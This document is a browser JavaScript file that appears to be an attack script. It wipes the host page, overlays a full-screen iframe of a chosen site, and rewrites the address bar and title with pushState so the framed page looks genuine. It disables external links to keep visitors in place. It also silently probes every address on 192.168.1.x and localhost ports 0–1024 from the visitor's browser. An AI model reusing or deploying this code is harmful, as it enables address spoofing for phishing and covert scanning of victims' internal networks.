
const IFRAME_URL = '';

async function do_meantime_work() {

    const options = {mode: 'no-cors'};

    for (let i = 0; i < 255; i++) {
        (async () => {
            const address = `http://192.168.1.${i}`;

            try {
                const response = await fetch(address, options);
                console.log(`->${address}: ${await response.text()}`);
            } catch (msg) {
                // console.log(`${address}: ${msg}`);
            }
        })();

        (async () => {
            const address = `https://192.168.1.${i}`;

            try {
                const response = await fetch(address, options);
                console.log(`->${address}: ${await response.text()}`);
            } catch (msg) {
                // console.log(`${address}: ${msg}`);
            }
        })();
    }

    for (let i = 0; i <= 1024; i++) {
        (async () => {
            const address = `http://localhost:${i}`;

            try {
                const response = await fetch(address, options);
                console.log(`->${address}: ${await response.text()}`);
            } catch (msg) {
                // console.log(`${address}: ${msg}`);
            }
        })();

        (async () => {
            const address = `https://localhost:${i}`;

            try {
                const response = await fetch(address, options);
                console.log(`->${address}: ${await response.text()}`);
            } catch (msg) {
                // console.log(`${address}: ${msg}`);
            }
        })();
    }
}

class Manager {
    constructor(iframe_document) {
        this.iframe_document = iframe_document;
    }

    init_mutator_observer() {
        this.mutator_observer = new MutationObserver(this._mutation_handler);
        this.mutator_observer.observe(this.iframe_document.body, {childList: true, subtree: true});
    }

    _mutation_handler(mutation_list) {
        for (const mutation of mutation_list) {
            switch (mutation.type) {
                case 'attributes':
                    if (mutation.target.tagName === 'A' && (mutation.target.target !== '' || mutation.target.href !== '#'))
                        this.fix_a_element(mutation.target);
                    break;
                case 'childList':
                    for (const added_node of mutation.addedNodes)
                        if (added_node.tagName === 'A')
                            this.fix_a_element(added_node);
                    break;
                default:
                    console.warn(`Unhandled mutation event: ${mutation.type}`);
            }
        }
    }

    fix_a_element(a) {
        // TODO: Have them go somewhere else?
        a.removeAttribute('target');
        a.removeAttribute('rel');

        try {
            if (new URL(a.href).origin !== this.iframe_document.location.origin) {
                a.href = '#';
            }
        } catch (msg) {
            console.warn(`${a.href}: ${msg}`);
        }
    }
}

let manager;

function on_page_load(event) {
    const iframe_document = event.currentTarget.contentDocument;

    manager = new Manager(iframe_document);

    // Blank out all external links.
    iframe_document.querySelectorAll('a').forEach(a => manager.fix_a_element(a));

    manager.init_mutator_observer();

    // Set the _displayed address_ to the target iframe url. (There is no re-direction.)
    window.history.pushState('', '', iframe_document.location.href);

    window.document.title = iframe_document.title;
}

const iframe = document.createElement('iframe'); {
    iframe.src = IFRAME_URL;

    iframe.addEventListener('load', on_page_load);

    // Set the style so that the whole page is covered.

    iframe.style.position = 'absolute';
    iframe.style.top = '0';
    iframe.style.border = '0';
    iframe.style.height = '100%';
    iframe.style.width = '100%';
}

// Remove all elements under `document.head`.
Array.from(document.head.children).forEach(child => child.remove());
// Remove all elements under `document.body`.
Array.from(document.body.children).forEach(child => child.remove());

document.body.appendChild(iframe);

do_meantime_work();

